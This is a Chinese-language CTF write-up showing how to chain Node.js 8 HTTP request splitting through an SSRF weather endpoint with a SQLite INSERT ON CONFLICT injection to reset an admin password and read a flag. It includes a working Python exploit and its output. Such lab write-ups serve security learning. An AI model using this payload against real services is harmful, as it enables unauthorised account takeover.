## 分析

```
FROM node:8.12.0-alpine
```

在 `nodejs <= 8` 的版本中，`http.get` 存在着 `HTTP request splitting` 拆分攻击
如果存在着一个`SSRF`漏洞，那么可以利用这个来发起任意的请求


通过分析代码，可以得知在管理员登录时候会显示出`flag`

```JavaScript
return db.isAdmin(username, password)
        .then(admin => {
            if (admin) return res.send(fs.readFileSync('/app/flag').toString());
```

在用户注册那里存在`sqlite`的`insert`注入，如果我们可以更改`admin`用户的密码，就可以获得`flag`

```SQL
INSERT INTO table (user, password) VALUES ('admin', 'password') ON CONFLICT(user) DO UPDATE SET PASSWORD='1234'
```

因为`nodejs`的问题，所以可以构造`SSRF`，这里需要注意的是，每个不可见字符都需要转换成`Unicode`

```python
#!/usr/bin/env python

import requests
from urllib.parse import quote

def smuggle(data):
    output = ''
    for x in data:
        c = ord(x)
        if c < 0x21 or c > 0x7F:
            c = 0x0100 | c
        output += chr(c)

    return output


register = "username=admin&password=1234') ON CONFLICT(username) DO UPDATE SET password='1234';--"
register = quote(register, safe="=()&,;--+ ")
register = smuggle(register)
body_len = len(register)        # 拆分请求中的空格也要转换


payload = "/ HTTP/1.1\r\n" + \
        "Host: 127.0.0.1\r\n" + \
        "\r\n" + \
        "POST /register HTTP/1.1\r\n" + \
        "Host: 127.0.0.1\r\n" + \
        "Content-Type: application/x-www-form-urlencoded\r\n" + \
        "Content-Length: " + str(body_len) + "\r\n" + \
        "\r\n" + \
        register + "\r\n" + \
        "\r\n" + \
        "POST / HTTP/1.1\r\n" + \       # 或者GET /?x= 也可以
        "Host: 127.0.0.1"               


payload = smuggle(payload)
print(payload)

data = {
    "endpoint": "127.0.0.1" + payload,
    "city": "NewYork",
    "country": "US"
        }

req = requests.post("http://157.245.32.36:31619/api/weather", data=data)
print(req.text)

req = requests.post("http://157.245.32.36:31619/login", data={"username":"admin", "password":"1234"})
print(req.text)

```

运行结果

```bash
/ĠHTTP/1.1čĊHost:Ġ127.0.0.1čĊčĊPOSTĠ/registerĠHTTP/1.1čĊHost:Ġ127.0.0.1čĊContent-Type:Ġapplication/x-www-form-urlencodedčĊContent-Length:Ġ91čĊčĊusername=admin&password=1234%27)ĠONĠCONFLICT(username)ĠDOĠUPDATEĠSETĠpassword=%271234%27;--čĊčĊPOSTĠ/ĠHTTP/1.1čĊHost:Ġ127.0.0.1
{"error":"Could not find NewYork or US"}
HTB{xxxxxxxxxxxxx}
```



# 参考链接

[https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/](https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/)

[https://bugzilla.mozilla.org/show_bug.cgi?id=1447452](https://bugzilla.mozilla.org/show_bug.cgi?id=1447452)

